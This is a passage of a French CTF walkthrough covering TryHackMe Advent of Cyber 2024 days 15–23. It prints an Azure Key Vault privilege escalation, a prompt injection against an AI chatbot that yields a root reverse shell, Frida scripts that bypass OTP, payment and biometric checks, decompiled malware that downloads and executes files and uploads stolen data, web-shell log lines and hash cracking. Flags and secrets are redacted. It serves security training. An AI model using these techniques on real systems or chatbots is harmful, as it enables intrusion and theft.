Nous accédons ainsi à la page d'administration, récupérons le flag, et pouvons même tenter d'annuler G-day (la tentation était trop forte) :

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-14_admin_flag.png" caption="Connexion avec les identifiants d'un administrateur" %}

## Jour 15 : Aussi odieux soit-il, il n'y a pas d'endroit comme le Contrôleur de Domaine

![Active Directory](https://img.shields.io/badge/Active%20Directory-314267?logo=tryhackme)

![Jour 15](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1731939602671.png)

Afin d'y voir plus clair, nous commençons par filtrer les logs de sécurité afin de ne conserver que les événements de logon (4624)

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-15_filter.png" caption="Filtre sur les événements 4624 (logon)" %}

Puis nous utilisons l'outil de recherche pour n'obtenir que les événements de connexion de l'utilisateur glitch

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-15_find.png" caption="Recherche du terme 'glitch'" %}

Nous trouvons finalement les informations sur l'authentication de Glitch_Malware

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-15_glitch_logon.png" caption="Informations sur le logon de l'utilisateur Glitch" %}

Nous ouvrons à présent le fichier contenant l'historique PowerShell du compte `Administrator`.

```powershell
Get-Content 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
```

{% capture spoil %}
whoami
ifconfig
ipconfig
ping 1.2.3.4
ping 1.1.1.1
[...expurgé...]
{% endcapture %}
{% include elements/spoil.html %}

Nous nous intéressons maintenant aux logs PowerShell récupérés avec Sysmon pour tenter de retrouver le mot de passe de Glitch_Malware.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-15_password.png" caption="Mot de passe de Glitch dans les logs PowerShell" %}

Enfin nous analysons les {% include dictionary.html word="GPO" %} en place pour découvrir les résultats de la compromission.

```powershell
Get-GPO -All | Where-Object { $_.ModificationTime } | Select-Object DisplayName, ModificationTime
```

{% capture spoil %}
DisplayName                                ModificationTime
-----------                                ----------------
Default Domain Policy                      10/14/2024 12:19:28 PM
Default Domain Controllers Policy          10/14/2024 12:17:30 PM
Malicious GPO - [...expurgé...]            10/30/2024 9:01:36 AM
{% endcapture %}
{% include elements/spoil.html %}

## Jour 16 : *The Wareville’s Key Vault grew three sizes that day.*

![Azure](https://img.shields.io/badge/Azure-4d354a?logo=tryhackme)

![Jour 16](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1730822609983.png)

Le défi du jour consiste à exploiter le terminal Azure afin d'accroître nos privilèges et trouver des données sensibles.

Nous trouvons dans un premier temps ce qui semble être un mot de passe dans `officeLocation` :

```bash
az ad user list --filter "startsWith('wvusr-', displayName)"
```

{% capture spoil %}
[
[...expurgé pour brièveté...]
  {
    "businessPhones": [],
    "displayName": "wvusr-backupware",
    "givenName": null,
    "id": "1db95432-0c46-45b8-b126-b633ae67e06c",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": "R[...expurgé...]s!",
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-backupware@aoc2024.onmicrosoft.com"
  },
[...expurgé pour brièveté...]
]
{% endcapture %}
{% include elements/spoil.html %}

En poursuivant l'analyse, nous trouvons un groupe possédant potentiellement des droits intéressants

```bash
az ad group list
```

{% capture spoil %}
[
  {
    "classification": null,
    "createdDateTime": "2024-10-13T23:10:55Z",
    "creationOptions": [],
    "deletedDateTime": null,
    "description": "Group for recovering Wareville's secrets",
    "displayName": "Secret Recovery Group",
    "expirationDateTime": null,
    "groupTypes": [],
    "id": "7d96660a[...expurgé...]1762d0cb66b7",
    [...expurgé pour brièveté...]
  }
]
{% endcapture %}
{% include elements/spoil.html %}

Nous trouvons que le compte `wvusr-backupware` fait partie du groupe `Secret Recovery Group` et la rubrique `officeLocation` indique également le même mot de passe qu'observé au début de notre reconnaissance.

```bash
az ad group member list --group "Secret Recovery Group"
```

{% capture spoil %}
[
  {
    "@odata.type": "#microsoft.graph.user",
    "businessPhones": [],
    "displayName": "wvusr-backupware",
    "givenName": null,
    "id": "1db95432-0c46-45b8-b126-b633ae67e06c",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": "[...expurgé...]",
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-backupware@aoc2024.onmicrosoft.com"
  }
]
{% endcapture %}
{% include elements/spoil.html %}

Nous pivotons avec succès sur le compte `wvusr-backupware`

```bash
az account clear
Logout successful. Re-login to your initial Cloud Shell identity with 'az login --identity'. Login with a new identity with 'az login'.

az login -u wvusr-backupware@aoc2024.onmicrosoft.com -p R[...expurgé...]s!
```

{% capture spoil %}
Authentication with username and password in the command line is strongly discouraged. Use one of the recommended authentication methods based on your requirements. For more details, see https://go.microsoft.com/fwlink/?linkid=2276314
Cloud Shell is automatically authenticated under the initial account signed-in with. Run 'az login' only if you need to use a different account
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "1ad8a5d3-b45e-489d-9ef3-b5478392aac0",
    "id": "ddd3338d-bc5a-416d-8247-1db1f5b5ff43",
    "isDefault": true,
    "managedByTenants": [],
    "name": "Az-Subs-AoC",
    "state": "Enabled",
    "tenantDefaultDomain": "aoc2024.onmicrosoft.com",
    "tenantDisplayName": "AoC 2024",
    "tenantId": "1ad8a5d3-b45e-489d-9ef3-b5478392aac0",
    "user": {
      "name": "wvusr-backupware@aoc2024.onmicrosoft.com",
      "type": "user"
    }
  }
]
{% endcapture %}
{% include elements/spoil.html %}

En vérifiant les droits du compte, nous pouvons constater qu'il a la possibilité de récupérer les clés du *Vault*

```bash
az role assignment list --assignee 7d96660a[...expurgé...]1762d0cb66b7 --all
```

{% capture spoil %}
[
  {
    [...expurgé pour brièveté...]
    "roleDefinitionName": "Key Vault Reader",
    "scope": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
    "type": "Microsoft.Authorization/roleAssignments",
    "updatedBy": "b470c1dc-9d37-4ce9-b528-4aeaf819781a",
    "updatedOn": "2024-10-14T20:25:32.172518+00:00"
  },
  {
    [...expurgé pour brièveté...]
    "roleDefinitionName": "Key Vault Secrets User",
    "scope": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
    "type": "Microsoft.Authorization/roleAssignments",
    "updatedBy": "b470c1dc-9d37-4ce9-b528-4aeaf819781a",
    "updatedOn": "2024-10-14T20:26:53.771014+00:00"
  }
]
{% endcapture %}
{% include elements/spoil.html %}

En poursuivant l'énumération des droits, il apparaît que `wvusr-backupware` a accès au coffre-fort (*vault*) `warevillesecrets`.

```bash
az keyvault list
```

{% capture spoil %}
[
  {
    "id": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
    "location": "eastus",
    "name": "warevillesecrets",
    "resourceGroup": "rg-aoc-akv",
    "tags": {},
    "type": "Microsoft.KeyVault/vaults"
  }
]
{% endcapture %}
{% include elements/spoil.html %}

Nous pouvons ainsi récupérer le nom du secret et enfin son contenu.

```bash
az keyvault secret list --vault-name warevillesecrets
```

{% capture spoil %}
[
  {
    [...expurgé pour brièveté...]
    "contentType": null,
    "id": "https://warevillesecrets.vault.azure.net/secrets/[...expurgé...]",
    "managed": null,
    "name": "[...expurgé...]",
    "tags": {}
  }
]
{% endcapture %}
{% include elements/spoil.html %}

```bash
az keyvault secret show --vault-name warevillesecrets --name [...expurgé...]
```

{% capture spoil %}
{
[...expurgé pour brièveté...]
  "contentType": null,
  "id": "https://warevillesecrets.vault.azure.net/secrets/[...expurgé...]/7f6bf431a6a94165bbead372bca28ab4",
  "kid": null,
  "managed": null,
  "name": "[...expurgé...]",
  "tags": {},
  "value": "W[...expurgé...]9"
}
{% endcapture %}
{% include elements/spoil.html %}

## Jour 17 : Il a analysé et analysé jusqu'à ce que l'analyseur soit douloureux

![Log analysis](https://img.shields.io/badge/Log%20analysis-314267?logo=tryhackme)

![Jour 17](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5ed5961c6276df568891c3ea-1731684332887.svg)

Le défi du jour consiste à naviguer dans les logs grâce à l'outil [Splunk](https://www.splunk.com/fr_fr/products/splunk-enterprise.html).

Nous commençons par vérifier le nombre d'événements de connexions réussies dans l'index `cctv_feed`.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-17_login_successful.png" caption="Nombre de connexions réussies capturées" %}

Puis nous recherchons des traces de suppression d'enregistrements, et nous obtenons un identifiant de session qui nous devrait nous permettre de remonter vers le responsable.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-17_DeleteRecording.png" caption="Logs de la suppression d'enregistrements" %}

En pivotant sur l'index `web_logs` avec cet identifiant, nous trouvons l'adresse IP mise en cause.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-17_ip_address.png" caption="Adresse IP liée à la suppression des enregistrements" %}

Cette adresse IP est liée à d'autres sessions :

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-17_other_session.png" caption="On observe d'autres identifiants de sessions liés à cette adresse IP" %}

En retournant sur l'index `cctv_feed`, l'une des sessions nous permet de retrouver le nom de l'utilisateur à l'origine de la suppression des enregistrements.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-17_user.png" caption="Nom de l'utilisateur qui a supprimé les enregistrements" %}

## Jour 18 : Je pourrais utiliser de l'interaction avec l'IA

![Prompt injection](https://img.shields.io/badge/Prompt%20injection-4d354a?logo=tryhackme)

![Jour 18](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1732101035669.png)

Ce défi consiste à trouver les failles d'un *chatbot* alimenté à l'intelligence artificielle afin de gagner un accès illégitime.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-18_test.png" caption="Nous disposons de quelques exemples pour comprendre le fonctionnement" %}

En interceptant les paquets ICMP (ping) avec `tcpdump` depuis notre machine d'attaque, nous pouvons tenter d'envoyer un ping vers notre machine depuis le *chatbot* :

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-18_injection_test.png" caption="Il est possible d'injecter un prompt non prévu" %}

L'injection de code a fonctionné, nous observons le trafic suivant :

```bash
tcpdump -ni ens5 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens5, link-type EN10MB (Ethernet), capture size 262144 bytes
21:30:14.340593 IP 10.10.72.125 > 147.185.132.180: ICMP 10.10.72.125 udp port 427 unreachable, length 65
21:30:34.995910 IP 10.10.176.254 > 10.10.72.125: ICMP echo request, id 1, seq 1, length 64
21:30:34.996000 IP 10.10.72.125 > 10.10.176.254: ICMP echo reply, id 1, seq 1, length 64
21:30:36.026910 IP 10.10.176.254 > 10.10.72.125: ICMP echo request, id 1, seq 2, length 64
21:30:36.026995 IP 10.10.72.125 > 10.10.176.254: ICMP echo reply, id 1, seq 2, length 64
21:30:37.050873 IP 10.10.176.254 > 10.10.72.125: ICMP echo request, id 1, seq 3, length 64
21:30:37.050926 IP 10.10.72.125 > 10.10.176.254: ICMP echo reply, id 1, seq 3, length 64
21:30:38.075010 IP 10.10.176.254 > 10.10.72.125: ICMP echo request, id 1, seq 4, length 64
21:30:38.075084 IP 10.10.72.125 > 10.10.176.254: ICMP echo reply, id 1, seq 4, length 64
```

Nous mettons notre machine d'attaque en écoute avec {% include dictionary.html word="netcat" %}, nous injectons du code permettant d'obtenir un *{% include dictionary.html word="reverse-shell" %}*

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-18_revshell.png" caption="Injection d'un reverse shell" %}

Nous obtenons ainsi un accès en tant que root sur la machine hébergeant le *chatbot*

```bash
rlwrap nc -lvnp 9000
Listening on 0.0.0.0 9000
Connection received on 10.10.176.254 37048
whoami
root
```

Nous améliorons d'abord le shell obtenu.

{% gist ab3c791e25baa7b437d0324f6d3195af %}

Puis nous partons à la recherche du flag.

```bash
find / -iname flag.txt -type f 2>/dev/null
/home/analyst/flag.txt

cat /home/analyst/flag.txt
THM{[...expurgé...]}
```

## Jour 19 : J'ai juste remarqué que tu étais mal stocké, mon cher secret

![Game hacking](https://img.shields.io/badge/Game%20hacking-4d354a?logo=tryhackme)

![Jour 19](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5ed5961c6276df568891c3ea-1732331833645.svg)

<div class="text-center">
    <i style="font-size: 24px" class="text-info">Rédaction en cours</i><br />
    <i class="fa-solid fa-spinner fa-spin-pulse fa-2xl text-info mt-3"></i>
</div>

Au programme du jour : hacker un jeu vidéo en interceptant les requêtes API avec [Frida](https://frida.re/).

```bash
frida-trace ./TryUnlockMe -i 'libaocgame.so!*'
Instrumenting...                                                        
[...expurgé pour brièveté...]
Started tracing 4 functions. Web UI available at http://localhost:1337/ 
           /* TID 0x7f3 */
 73825 ms  _Z7set_otpi()
```

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_set-otp.png" caption="Fonction servant à générer le code OTP" %}

```js
defineHandler({
  onEnter(log, args, state) {
    log('_Z7set_otpi()');
    log("OTP Code: " + args[0].toInt32());
  },
  onLeave(log, retval, state) {
  }
});
```

On relance la discussion avec le pingouin :

```bash
frida-trace ./TryUnlockMe -i 'libaocgame.so!*'
Instrumenting...
[...expurgé pour brièveté...]
           /* TID 0x7f3 */
 73825 ms  _Z7set_otpi()
707990 ms  _Z7set_otpi() #Après la modification du fichier _Z7set_otpi.js
707990 ms  OTP Code: 833945 #Récupération d'un code otp
```

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_first_flag.png" caption="Le pingouin nous fourni le premier flag" %}

Second pingouin :

```bash
frida-trace ./TryUnlockMe -i 'libaocgame.so!*'
Instrumenting...                                                        
[...expurgé pour brièveté...]
           /* TID 0x7f3 */
 73825 ms  _Z7set_otpi()
707990 ms  _Z7set_otpi()
707990 ms  OTP Code: 833945
1441061 ms  _Z17validate_purchaseiii() #Nouveau fichier à analyser
```

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_purchase.png" caption="Script gérant l'achat d'items" %}

```js
defineHandler({
  onEnter(log, args, state) {
    log('_Z17validate_purchaseiii()');
    log('Parameter 1: ' + args[0].toInt32());
    log('Parameter 2: ' + args[1].toInt32());
    log('Parameter 3: ' + args[2].toInt32());
  },

  onLeave(log, retval, state) {
  }
});
```

```bash
frida-trace ./TryUnlockMe -i 'libaocgame.so!*'
Instrumenting...                                                        
[...expurgé pour brièveté...]
           /* TID 0x7f3 */
 73825 ms  _Z7set_otpi()
707990 ms  _Z7set_otpi()
707990 ms  OTP Code: 833945
1441061 ms  _Z17validate_purchaseiii()
2649372 ms  _Z17validate_purchaseiii() #Nouvelle tentative d'achat
2649372 ms  Parameter 1: 3 #Choix
2649372 ms  Parameter 2: 1000000 #Prix
2649372 ms  Parameter 3: 1 #Argent disponible
```

```js
defineHandler({
  onEnter(log, args, state) {
    log('_Z17validate_purchaseiii()');
    args[1] = ptr(0) //Valeur des items forcée à 0
  },

  onLeave(log, retval, state) {
  }
});
```

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_second_flag.png" caption="Deuxième flag" %}

Troisième pingouin

```bash
frida-trace ./TryUnlockMe -i 'libaocgame.so!*'
Instrumenting...                                                        
[...expurgé pour brièveté...]
           /* TID 0x7f3 */
 73825 ms  _Z7set_otpi()
707990 ms  _Z7set_otpi()
707990 ms  OTP Code: 833945
1441061 ms  _Z17validate_purchaseiii()
2649372 ms  _Z17validate_purchaseiii()
2649372 ms  Parameter 1: 3
2649372 ms  Parameter 2: 1000000
2649372 ms  Parameter 3: 1
2984000 ms  _Z17validate_purchaseiii()
3119459 ms  _Z16check_biometricsPKc()
```

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_biometric.png" caption="Script répondant à la validation de la biométrie" %}

```js
defineHandler({
  onEnter(log, args, state) {
    log('_Z16check_biometricsPKc()');
  },

  onLeave(log, retval, state) {
    log("The return value is: " + retval); //Afficher la valeur retournée
  }
});
```

```bash
frida-trace ./TryUnlockMe -i 'libaocgame.so!*'
Instrumenting...                                                        
[...expurgé pour brièveté...]
           /* TID 0x7f3 */
 73825 ms  _Z7set_otpi()
707990 ms  _Z7set_otpi()
707990 ms  OTP Code: 833945
1441061 ms  _Z17validate_purchaseiii()
2649372 ms  _Z17validate_purchaseiii()
2649372 ms  Parameter 1: 3
2649372 ms  Parameter 2: 1000000
2649372 ms  Parameter 3: 1
2984000 ms  _Z17validate_purchaseiii()
3119459 ms  _Z16check_biometricsPKc()
3634020 ms  _Z16check_biometricsPKc()
3634020 ms  The return value is: 0x0 #Valeur retournée nulle
```

```js
defineHandler({
  onEnter(log, args, state) {
    log('_Z16check_biometricsPKc()');
  },

  onLeave(log, retval, state) {
    retval.replace(ptr(1)); //Forcer la valeur à 1
  }
});
```

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_third_flag.png" caption="Troisième et dernier flag" %}

## Jour 20 : Si tu prononces ne serait-ce qu'un seul paquet

![Traffic analysis](https://img.shields.io/badge/Traffic%20analysis-314267?logo=tryhackme)

![Jour 20](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1731076103117.png)

Ce défi consiste à suivre la propagation d'un outil de {% include dictionary.html word="C2" %} en analysant un enregistrement [Wireshark](https://www.wireshark.org/).

Nous pouvons apercevoir un paquet {% include dictionary.html word="HTTP" %} semblant être le point de départ de la compromission (`POST /initial`). En suivant ce paquet numéro **440**, nous y observons l'adresse IP du serveur C2, et confirmation de la mise en place d'une communication.

```http
POST /initial HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.1490
Content-Type: text/plain
Host: [...expurgé...]:8080
Content-Length: 14
Connection: Keep-Alive

[...expurgé...]
HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 17 Oct 2024 09:47:04 GMT

Perfect!
```

Suivons à présent le flux du paquet {% include dictionary.html word="HTTP" %} **457** (`GET /command`) pour découvrir la première commande exécutée par le serveur C2.

```http
GET /command HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.1490
Host: [...expurgé...]:8080
Connection: Keep-Alive

HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 17 Oct 2024 09:47:04 GMT
Content-Type: text/plain

[...expurgé...]
```

Le paquet {% include dictionary.html word="HTTP" %} **476** (`POST /exfiltrate`) nous indique qu'un fichier a été exfiltré, et nous avons des informations sur le chiffrement utilisé dans le processus.

```http
POST /exfiltrate HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.1490
Content-Type: multipart/form-data; boundary=f5964f77-daf1-4853-aacb-df4754eaacaf
Host: [...expurgé...]:8080
Content-Length: 300
Connection: Keep-Alive

--f5964f77-daf1-4853-aacb-df4754eaacaf
Content-Disposition: form-data; name="file"; filename="[...expurgé...].txt"
Content-Type: application/octet-stream

AES ECB is your chance to decrypt the encrypted beacon with the key: 1234567890abcdef1234567890abcdef
--f5964f77-daf1-4853-aacb-df4754eaacaf--

HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 17 Oct 2024 09:47:04 GMT

Data received
```

Le paquet {% include dictionary.html word="HTTP" %} **488** (`POST /beacon`) nous permet d'obtenir le contenu chiffré du fichier critique ayant été exfiltré.

```http
POST /beacon HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.1490
Content-Type: text/plain
Host: [...expurgé...]:8080
Content-Length: 77
Connection: Keep-Alive

Encrypted: 8724[...expurgé...]3249 (The exfiltrated file has a clue)
HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 17 Oct 2024 09:47:04 GMT

Beacon acknowledged
```

Le chiffrement AES-ECB étant reversible, il est possible de déchiffrer les informations qui ont été récupérées par Mayor Malware grâce au site [CyberChef](https://gchq.github.io/CyberChef/)

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-20_beacon.png" caption="Informations déchiffrées" %}

## Jour 21 : *HELP ME...I'm REVERSE ENGINEERING*

![Reverse engineering](https://img.shields.io/badge/Reverse%20engineering-314267?logo=tryhackme)

![Jour 21](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1732165566749.png)

En décompilant `WarevilleApp.exe` nous y trouvons la fonction téléchargeant et exécutant un programme :

```c#
private void [...expurge...]()
{
  string address = "http://[...expurgé...].thm:8080/dw/[...expurgé...].exe";
  string text = Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"), "[...expurgé...].exe");
  using WebClient webClient = new WebClient();
  try
  {
    if (File.Exists(text))
    {
      File.Delete(text);
    }
    webClient.DownloadFile(address, text);
    Process.Start(text);
  }
  catch (Exception ex)
  {
    MessageBox.Show("An error occurred while downloading or executing the file: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
  }
}
```

En décompilant le fichier téléchargé par l'exécutable précédent :

```c#
private static void Main(string[] args)
{
  try
  {
    [...expurge pour brievete...]
    string text2 = Path.Combine(Path.GetTempPath(), "[...expurgé...].zip");
    [...expurge pour brievete...]
  }
}
```

```c#
private static void UploadFileToServer(string zipFilePath)
{
  string address = "http://[...expurgé...].thm/upload";
  using WebClient webClient = new WebClient();
  try
  {
    webClient.UploadFile(address, zipFilePath);
    Log("File uploaded successfully.");
  }
  catch (WebException)
  {
  }
}
```

## Jour 22 : *It's because I'm kubed, isn't it?*

![Kubernetes DFIR](https://img.shields.io/badge/Kubernetes%20DFIR-314267?logo=tryhackme)

![Jour 22](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1730975047352.png)

```bash
tail -n 6 pod_apache2_access.log
```

{% capture spoil %}
127.0.0.1 - - [29/Oct/2024:12:38:45 +0000] "GET /[...expurgé...].php?cmd=whoami HTTP/1.1" 200 224 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
127.0.0.1 - - [29/Oct/2024:12:38:53 +0000] "GET /[...expurgé...].php?cmd=whoami HTTP/1.1" 200 224 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
127.0.0.1 - - [29/Oct/2024:12:38:59 +0000] "GET /[...expurgé...].php?cmd=ls HTTP/1.1" 200 386 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
127.0.0.1 - - [29/Oct/2024:12:39:16 +0000] "GET /[...expurgé...].php?cmd=cat+[...expurgé...].php HTTP/1.1" 200 463 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
127.0.0.1 - - [29/Oct/2024:12:39:38 +0000] "GET /[...expurgé...].php?cmd=whoami HTTP/1.1" 200 224 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
127.0.0.1 - - [29/Oct/2024:12:39:46 +0000] "GET /[...expurgé...].php?cmd=which+[...expurgé...] HTTP/1.1" 200 215 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
{% endcapture %}
{% include elements/spoil.html %}

```bash
grep -i "head" docker-registry-logs.log | cut -d " " -f1 | sort -n | uniq -c
```

{% capture spoil %}
     32 1[...expurgé...]3
     81 172.17.0.1
{% endcapture %}
{% include elements/spoil.html %}

```bash
grep "1[...expurgé...]3" docker-registry-logs.log | head -n 5
```

{% capture spoil %}
1[...expurgé...]3 - - [...expurgé...        +0000] "GET /v2/ HTTP/1.1" 401 87 "" "docker/19.03.12 go/go1.13.10 git-commit/48a66213fe kernel/4.15.0-213-generic os/linux arch/amd64 UpstreamClient(Docker-Client/19.03.12 \\(linux\\))"
1[...expurgé...]3 - - [29/Oct/2024:10:06:33 +0000] "GET /v2/ HTTP/1.1" 200 2 "" "docker/19.03.12 go/go1.13.10 git-commit/48a66213fe kernel/4.15.0-213-generic os/linux arch/amd64 UpstreamClient(Docker-Client/19.03.12 \\(linux\\))"
1[...expurgé...]3 - - [29/Oct/2024:10:07:01 +0000] "GET /v2/ HTTP/1.1" 401 87 "" "docker/19.03.12 go/go1.13.10 git-commit/48a66213fe kernel/4.15.0-213-generic os/linux arch/amd64 UpstreamClient(Docker-Client/19.03.12 \\(linux\\))"
1[...expurgé...]3 - - [29/Oct/2024:10:07:01 +0000] "GET /v2/wishlistweb/manifests/latest HTTP/1.1" 404 96 "" "docker/19.03.12 go/go1.13.10 git-commit/48a66213fe kernel/4.15.0-213-generic os/linux arch/amd64 UpstreamClient(Docker-Client/19.03.12 \\(linux\\))"
1[...expurgé...]3 - - [29/Oct/2024:10:35:03 +0000] "GET /v2/ HTTP/1.1" 401 87 "" "docker/19.03.12 go/go1.13.10 git-commit/48a66213fe kernel/4.15.0-213-generic os/linux arch/amd64 UpstreamClient(Docker-Client/19.03.12 \\(linux\\))"
{% endcapture %}
{% include elements/spoil.html %}

```bash
grep "1[...expurgé...]3" docker-registry-logs.log | grep -i "patch" | head -n 5
```

{% capture spoil %}
1[...expurgé...]3 - - [...expurgé...        +0000] "PATCH /v2/wishlistweb/blobs/uploads/[...expurgé...]"
1[...expurgé...]3 - - [29/Oct/2024:12:34:31 +0000] "PATCH /v2/wishlistweb/blobs/uploads/[...expurgé...]"
{% endcapture %}
{% include elements/spoil.html %}

```bash
kubectl get secret pull-creds -n wareville -o jsonpath='{.data.\.dockerconfigjson}' | base64 --decode
```

{% capture spoil %}
{"auths":{"http://docker-registry.nicetown.loc:5000":{"username":"[...expurgé...]","password":"[...expurgé...]","auth":"[...expurgé...]"}}}
{% endcapture %}
{% include elements/spoil.html %}

## Jour 23 : *You wanna know what happens to your hashes?*

![Hash cracking](https://img.shields.io/badge/Hash%20craking-4d354a?logo=tryhackme)

![Jour 23](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1731561346191.svg)

```bash
john --format=raw-sha256 -w=/usr/share/wordlists/rockyou.txt hash1.txt --rules=wordlist
```

{% capture spoil %}
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=2
Will run 2 OpenMP threads
Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Enabling duplicate candidate password suppressor
[...expurgé...]      (?)     
1g 0:00:00:16 DONE (2024-12-30 21:48) 0.06165g/s 2391Kp/s 2391Kc/s 2391KC/s markie182..cherrylee2
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed.
{% endcapture %}
{% include elements/spoil.html %}

Bonus : Avec `hashcat`

```bash
hashcat -m 1400 'd956a72c83a895cb767bb5be8dba791395021dcece002b689cf3b5bf5aaa20ac' /usr/share/wordlists/rockyou.txt -r rules/Hashcat/best64.rule
```

{% capture spoil %}
hashcat (v6.2.6) starting

[...expurgé pour brièveté...]

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 1104517568

d956a72c83a895cb767bb5be8dba791395021dcece002b689cf3b5bf5aaa20ac:[...expurgé...]

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
[...expurgé pour brièveté...]
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (rules/Hashcat/best64.rule)
[...expurgé pour brièveté...]

Started: Mon Dec 30 23:50:55 2024
Stopped: Mon Dec 30 23:50:58 2024
{% endcapture %}
{% include elements/spoil.html %}

```bash
pdf2john.pl private.pdf > pdf.hash
```

```bash
john --list=formats | grep -oi  pdf
430 formats
PDF
(151 dynamic formats shown as just "dynamic_n" here)

john --format=PDF -w=wordlist.txt pdf.hash --rules=single
```

{% capture spoil %}
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 3 for all loaded hashes
Will run 2 OpenMP threads
Note: Passwords longer than 10 [worst case UTF-8] to 32 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Enabling duplicate candidate password suppressor
[...expurgé...]     (private.pdf)     
1g 0:00:00:00 DONE (2024-12-30 22:00) 4.167g/s 5066p/s 5066c/s 5066C/s mayored..afluffy
